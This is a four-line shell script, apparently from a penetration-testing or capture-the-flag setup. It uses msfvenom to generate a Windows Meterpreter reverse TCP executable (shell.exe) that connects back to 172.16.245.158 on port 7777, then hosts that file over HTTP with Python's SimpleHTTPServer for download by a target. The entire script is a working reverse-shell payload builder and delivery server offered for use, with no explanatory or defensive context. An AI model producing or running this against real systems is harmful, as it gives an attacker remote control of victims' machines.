msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.245.158 LPORT=7777 -f exe -o shell.exe
echo '[*] Serving up shell.exe at http://172.16.245.158/shell.exe'
echo '[*] Ctrl + c to kill'
python -m SimpleHTTPServer 80
